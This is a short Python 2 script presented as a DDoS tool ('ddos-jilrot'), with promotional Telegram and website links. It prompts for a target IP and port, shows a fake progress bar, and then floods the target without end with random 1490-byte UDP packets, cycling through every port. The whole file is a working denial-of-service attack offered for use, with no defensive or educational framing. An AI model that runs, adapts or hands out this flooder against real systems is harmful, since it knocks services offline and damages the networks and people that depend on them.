import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet ddos-jilrot")
print
print "https://jailbreakandroot.tk"
print "https://t.me/kali_Linuxxx"
print "https://t.me/jailbreakandroot"
print "https://github.com/jailbreakandroot"
print "code by @mohamadg80"

print
ip = raw_input("IP Target~#  ")
port = input("Port~#        ")

os.system("clear")
os.system("figlet jilrot")
print "jailbreakandroot...   0% "
time.sleep(5)
print "jailbreakandroot....    25%"
time.sleep(5)
print "jailbreakandroot.....    50%"
time.sleep(5)
print "jailbreakandroot......    75%"
time.sleep(5)
print "jailbreakandroot.......   100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

